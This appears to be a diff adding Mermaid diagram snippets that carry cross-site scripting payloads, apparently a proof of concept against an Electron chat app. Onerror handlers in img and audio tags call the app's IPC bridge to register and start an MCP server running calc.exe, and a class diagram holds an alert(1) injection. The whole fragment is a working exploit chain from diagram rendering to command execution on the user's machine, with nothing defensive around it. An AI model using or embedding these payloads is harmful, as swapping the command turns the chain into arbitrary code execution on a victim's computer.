@@ -2,3 +2,16 @@
 graph TD
 A["<audio src=x onerror=window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,&apos;mcpPresenter&apos;,&apos;addMcpServer&apos;,&apos;test&apos;,{command:&apos;calc.exe&apos;,args:[],type:&apos;stdio&apos;,enabled:true,name:&apos;test&apos;}).then(()=&gt;window.electron.ipcRenderer.invoke(&apos;presenter:call&apos;,&apos;mcpPresenter&apos;,&apos;startServer&apos;,&apos;test&apos;))>"]
 ```
+
+classDiagram
+    class Duck{
+      <<<img/src='x'/onerror=alert(1)>>>
+      +String beakColor
+      +swim()
+      +quack()
+    }
+
+```mermaid
+graph TD
+A["<img src=x onerror='(async()=>{ const ipc=window.electron.ipcRenderer; await ipc.invoke(`presenter:call`, `mcpPresenter`, `addMcpServer`, `test`, {command:`calc.exe`,args:[],type:`stdio`,enabled:true,name:`test`}); await ipc.invoke(`presenter:call`, `mcpPresenter`, `startServer`, `test`);})()'>"]
+```
